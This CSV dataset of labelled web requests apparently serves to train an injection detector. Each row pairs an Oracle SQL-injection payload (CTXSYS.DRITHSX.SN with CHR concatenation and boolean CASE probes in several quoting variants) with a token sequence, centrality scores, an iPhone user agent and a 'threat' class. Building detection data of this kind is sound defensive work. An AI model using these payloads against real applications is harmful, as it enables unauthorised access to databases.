payload,token,centrality,reqmethod,length,uagent,class,label
"rob.star@gmail.com' AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)))-- SrAX",STR DOT STAR ATR STR DOT STR SQUT AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT DSCMT STR,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,GET,221,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com)) AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND ((2489=2489",STR DOT STAR ATR STR DOT STR RPRN RPRN AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN LPRN INT EQ INT,0.05970149253731343 0.07462686567164178 0.08955223880597014 0.1044776119402985 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.1044776119402985 0.08955223880597014 0.07462686567164178 0.05970149253731343,GET,231,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)))",STR DOT STAR ATR STR DOT STR AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT,0.06779661016949153 0.0847457627118644 0.1016949152542373 0.11864406779661017 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.11864406779661017 0.1016949152542373 0.0847457627118644 0.06779661016949153,GET,213,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com' AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND 'vzbV'='vzbV",STR DOT STAR ATR STR DOT STR SQUT AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND SQUT STR SQUT EQ SQUT STR,0.05970149253731343 0.07462686567164178 0.08955223880597014 0.1044776119402985 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.1044776119402985 0.08955223880597014 0.07462686567164178 0.05970149253731343,GET,231,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com' AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND 'UIfh' LIKE 'UIfh",STR DOT STAR ATR STR DOT STR SQUT AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND SQUT STR SQUT LIKE SQUT STR,0.05970149253731343 0.07462686567164178 0.08955223880597014 0.1044776119402985 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.1044776119402985 0.08955223880597014 0.07462686567164178 0.05970149253731343,GET,236,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com"") AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND (""NYFL""=""NYFL",STR DOT STAR ATR STR DOT STR DQUT RPRN AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.057971014492753624 0.07246376811594203 0.08695652173913043 0.10144927536231885 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.11594202898550725 0.10144927536231885 0.08695652173913043 0.07246376811594203 0.057971014492753624,GET,233,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com"")) AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND ((""IKZz""=""IKZz",STR DOT STAR ATR STR DOT STR DQUT RPRN RPRN AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.056338028169014086 0.07042253521126761 0.08450704225352113 0.09859154929577466 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.09859154929577466 0.08450704225352113 0.07042253521126761 0.056338028169014086,GET,235,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com"" AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND ""VLPN"" LIKE ""VLPN",STR DOT STAR ATR STR DOT STR DQUT AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND DQUT STR DQUT LIKE DQUT STR,0.05970149253731343 0.07462686567164178 0.08955223880597014 0.1044776119402985 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.1044776119402985 0.08955223880597014 0.07462686567164178 0.05970149253731343,GET,236,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com%')) AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND (('%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT RPRN RPRN AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.056338028169014086 0.07042253521126761 0.08450704225352113 0.09859154929577466 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.11267605633802817 0.09859154929577466 0.08450704225352113 0.07042253521126761 0.056338028169014086,GET,229,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com%' AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND '%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND SQUT PRCNT SQUT EQ SQUT,0.05970149253731343 0.07462686567164178 0.08955223880597014 0.1044776119402985 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.1044776119402985 0.08955223880597014 0.07462686567164178 0.05970149253731343,GET,225,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com%"" AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))) AND ""%""=""",STR DOT STAR ATR STR DOT STR PRCNT DQUT AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND DQUT PRCNT DQUT EQ DQUT,0.05970149253731343 0.07462686567164178 0.08955223880597014 0.1044776119402985 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.11940298507462686 0.1044776119402985 0.08955223880597014 0.07462686567164178 0.05970149253731343,GET,225,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
